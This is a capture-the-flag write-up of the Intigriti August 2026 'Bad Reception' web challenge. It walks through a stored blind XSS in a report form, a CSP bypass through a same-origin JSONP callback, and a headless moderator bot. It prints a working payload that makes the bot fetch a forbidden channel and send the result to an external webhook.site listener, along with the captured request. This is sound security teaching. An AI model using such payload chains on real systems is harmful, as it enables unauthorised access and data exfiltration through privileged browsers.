---
title: 'Bad Reception: Chaining a Blind XSS, a JSONP Gadget and a Bot to Solve Intigriti 0826'
description: 'Full write-up of the Intigriti August 2026 challenge: stored blind XSS in a report form, a same-origin JSONP endpoint defeating CSP, and exfiltrating a hidden channel from a moderator bot.'
pubDate: 2026-09-01
tags: ['ctf', 'xss', 'intigriti', 'csp-bypass', 'blind-xss', 'writeup']
cover: '/images/badreception-ch11.png'
---

The challenge was called **Bad Reception** and the premise fit in one sentence: a wood-panelled 1970s television, ten channels, all of them static snow, and the goal printed right on the screen. "Make the TV work to capture the flag." Here's how I solved it.

## The chain in one paragraph

The report form (`POST /api/report`) validates `channelId` with a single rule: it must start with a digit. Everything after that first character is stored and later rendered as HTML on an internal moderation page (`/moderate/<id>`, which answers `403 forbidden` from the outside) that a headless Chrome moderator bot visits. The page sanitizes the content and strips every inline event handler, but it lets `<script>` elements through. The page also sets CSP `script-src 'self'`, which normally kills that attack, except the site ships its own JSONP endpoint that reflects any `callback` value as `application/javascript`, and a same-origin script satisfies CSP just fine. So my script runs in the bot's browser, the bot fetches channel 11 (which I'm forbidden from reading myself), and the response leaks the filename of a public video file. The flag is burned into that video.

Flag: `INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}`

## Day one: poking the TV

The page source is tiny. A keypad that calls `GET /api/channels/{n}/load`, a regex that pins the video source to `^[A-Za-z0-9._-]+\.mp4$`, and a report button in the corner shaped like a warning triangle.

```
GET  /api/channels/{n}/load   n=1..10 -> "static.mp4", n>10 -> 403 "channel not available"
POST /api/report              channelId=<digit-prefixed anything> -> {"id":"<16hex>","status":"queued"}
```

Two endpoints. That's the entire app. There's also a commented-out `X-Channel-Id` header in the client JS. Commented-out code is the developer talking to you, so I chased it first; the server turned out to ignore it completely, but hunting it made me map everything else.

## The form that swallows everything

The validation on `channelId` is exactly one rule: first character must be a digit. I fed it `1;id=1`, `1<b>x</b>`, even `1<svg>`. All accepted, all `queued`. Whatever comes after that first digit goes into storage untouched.

Then the trail goes cold. The response gives me a report id, and I wanted to see where it renders. I brute-forced every plausible view route: `/report/<id>`, `/reports/<id>`, `/api/report/<id>`, query variants, paths under `/challenge`. All 404. Nothing on the site ever shows me my own report back.

Which leaves one explanation: my input renders somewhere I can't read. I confirmed the internal route exists because `GET /moderate/<id>` answers a bare `403 "forbidden"` (9 bytes, app-level, same for every id, session or no session). That's a gate in front of a real page, not a missing route. Something inside the network opens my reports. Blind XSS, then.

## Three rounds of silence

I set up a listener on webhook.site and fired the standard blind XSS matrix: `img onerror`, `svg onload`, attribute breakouts, bare resource loads that need no JavaScript at all. Tagged every payload with a marker so I could tell which one fired.

Nothing. Round two, tweaked payloads, nothing. Round three, still nothing.

I want to be honest about this stretch because it's where I burned real time: I stopped trusting the exploit and started suspecting the infrastructure. Was the bot asleep? Was outbound traffic from the bot blocked? Was my listener the problem? I re-tested the listener, changed collectors, even sent payloads with no JS at all in case script execution was blocked but image loading wasn't. Silence on all fronts.

The answer was dumber and more interesting: those event handlers never existed. A sanitizer on the render side (DOMPurify-class behavior) deletes `onerror`, `onload`, `onfocus` and friends before the page even parses. My payloads weren't being blocked at runtime. They were being deleted at birth. That's why bare resource loads with handlers died too, and it told me the only thing that could survive was an element with no attributes worth stripping.

## The gadget was one request away

What survives sanitization: the `<script>` element itself. That's unusual and deliberate; a sanitizer config that re-admits `script` is a bug by itself. But a surviving `<script>` under CSP `script-src 'self'` is a paperweight unless the origin hands me JavaScript. So I went back to my endpoint list and asked a question I should have asked hours earlier: is there any URL on this origin that answers with JavaScript I control?

```
GET /api/jsonp?callback=alert(1)//

/**/ alert(1)//({"channels": 10});
```

There it is. The callback is reflected with zero validation, served as `application/javascript`, and the trailing `//` comments out the endpoint's own JSON tail. Same-origin script, CSP waves it through, and whatever I write after `callback=` is my program.

One encoding note that cost me a working exploit on the first try: the JavaScript inside that URL can't contain `+` or `&`. The body is urlencoded, so `+` decodes to a space and `&` splits parameters, and either one silently mangles the script `src`. I built the exfil URL with a template literal and a single query param instead.

## The payload

Sent as `channelId` on `POST /api/report`:

```
07<script src="/api/jsonp?callback=fetch('/api/channels/11/load').then(r=>r.text()).then(t=>fetch(`https://webhook.site/<my-uuid>?f=${t}`))//"></script>
```

Reads as: as the bot, fetch channel 11's stream name, and hand it to me.

Seconds later, the listener lit up:

```
GET https://webhook.site/<my-uuid>?f=3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_0) ... Chrome/136.0.0.0 Safari/537.36
```

That beacon is the whole bug in one line. A headless moderator bot just ran my JavaScript, read a channel the API answers `403 channel not available` to me, and exfiltrated the result to a server I control. The bot isn't capped at ten channels. I am. Which is exactly what the official hints were pointing at: fix the reception, get past the ten-channel limit, and report it to make someone else look.

## Cash in the video

The filename points at a plain static file. No auth, no signature. The only thing hiding it was the name:

```
GET /static/streams/3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4 -> 200 (15 KB)
```

Fifteen kilobytes of H.264. I dropped it into ffmpeg, pulled the frames, and channel 11 finally came in clear:

![Channel 11, finally in clear](/images/badreception-ch11.png)

"CH 11" on the OSD, and the flag on the screen: `INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}`

Bad reception, fixed.

## Impact

An unauthenticated attacker goes from "submit one form" to arbitrary JavaScript execution inside the moderation bot's browser, on the app's own origin. The bot's privileges then apply: it reads a channel that is explicitly forbidden to regular users and reaches an internal moderation page that is gated off from the outside for every session. The exfiltrated resource is a public static file whose only protection was its unguessable name, which the XSS defeats directly. The report rate limit is bound to a client-controlled session cookie and is trivially bypassed by dropping it. In a real deployment this is the admin-browser scenario: the attacker rides the bot's session and identity to read internal endpoints and exfiltrate anything the bot can touch.

## What I'd tell past me

- When a form swallows everything and echoes nothing, the render surface is someone else's browser. Set up the listener early, but don't read silence as "the bot is broken"; read it as "my vectors are being removed before they can fire." Those are opposite problems with opposite fixes.
- Event handlers all dead means you're fighting a sanitizer, and the fight is over elements, not attributes. A sanitizer that lets `<script>` through is not a sanitizer for that page.
- With CSP `script-src 'self'`, the win is almost never out-clevering the policy. It's finding the endpoint on the allowed origin that hands back JavaScript. I was hours into building a character-stealing CSS oracle when the JSONP endpoint sat one request away, unexamined.
- A "hidden" static file whose name you can exfiltrate is not access-controlled. The bot's view of channel 11 was properly gated; the file it points to was not. Chain those and the gate is decoration.
